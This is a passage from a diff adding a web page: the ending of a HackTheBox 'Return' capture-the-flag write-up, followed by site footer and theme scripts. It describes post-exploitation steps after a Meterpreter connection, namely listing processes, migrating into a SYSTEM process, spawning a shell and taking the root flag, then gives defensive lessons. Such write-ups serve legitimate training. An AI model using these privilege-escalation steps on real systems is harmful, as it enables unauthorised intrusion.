+<p><img alt="connection" src="../../../assets/writeups/return/meterpreter%2013.png" /></p>
+<p>Quickly after it's connected to your listener, type <code>ps</code> to list the running processes. Choose an appropriate process which is running as <code>NT AUTHORITY\SYSTEM</code></p>
+<p>After you have found the <code>PID</code> which is all the way on the left, type <code>migrate &lt;PID&gt;</code>.</p>
+<p>Now that you have a connection, type <code>shell</code> to spawn a shell and grab the root flag.</p>
+<p><img alt="nt auth" src="../../../assets/writeups/return/nt%20auth%2014.png" /></p>
+<p>Doing <code>cd ..</code> untill we are at <code>C:</code> we can navigate to <code>\Users\Administrator\Desktop</code> and find the root flag there.</p>
+<p><img alt="root" src="../../../assets/writeups/return/root.png" /></p>
+<p>Pwned!
+<img alt="Pwned" src="../../../assets/writeups/return/pwned.png" /></p>
+<hr />
+<h2 id="lessons-learned">LESSONS LEARNED<a class="headerlink" href="#lessons-learned" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Always check memberships of service accounts.</p>
+</li>
+<li>
+<p>Network devices can be leveraged to gain domain credentials.</p>
+</li>
+<li>
+<p>Proper segmentation and least privilege are critical in domain environments.</p>
+</li>
+</ul>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Nmap: https://nmap.org/</p>
+</li>
+<li>
+<p>Enum4linux: https://github.com/CiscoCXSecurity/enum4linux</p>
+</li>
+<li>
+<p>Evil-winRM: https://github.com/Hackplayers/evil-winrm</p>
+</li>
+<li>
+<p>Metasploit: https://www.metasploit.com/</p>
+</li>
+<li>
+<p>HackTheBox: https://hackthebox.com/</p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../" class="md-footer__link md-footer__link--prev" aria-label="Previous: Writeups">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Writeups
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../darkzero/" class="md-footer__link md-footer__link--next" aria-label="Next: DarkZero">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                DarkZero
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2025 Certifa
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/Certifa" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://app.hackthebox.com/profile/444744" target="_blank" rel="noopener" title="app.hackthebox.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.path", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "navigation.expand", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
